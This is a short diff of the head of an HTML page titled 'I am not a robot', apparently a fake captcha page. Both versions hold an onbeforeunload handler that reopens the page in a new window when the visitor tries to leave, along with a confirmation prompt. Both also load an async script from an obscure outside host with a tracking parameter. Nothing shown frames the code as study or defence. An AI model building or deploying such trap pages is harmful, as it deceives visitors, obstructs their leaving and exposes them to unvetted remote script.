@@ -1,16 +1,13 @@
 <!DOCTYPE html>
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <script src="//raupsooy.net/ntfc.php?p=2686906&tco=1" data-cfasync="false" async></script>
-<script>
-// Warning before leaving the page (back button, or outgoinglink)
-window.onbeforeunload = function() {
-window.open('tests2.html') ;
-
-   return "Do you really want to leave our brilliant application?";
-   //if we return nothing here (just calling return;) then there will be no pop-up question at all
-   //return;
-};
+<script language="JavaScript">
+  window.onbeforeunload = function(e) {
+           window.open(document.URL,"_blank");
+           return 'Dialog text here.';
+        };
 </script>
+    <script src="//raupsooy.net/ntfc.php?p=2686906&tco=1" data-cfasync="false" async></script>
+
     <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0">
     <title>I am not a robot</title>
 
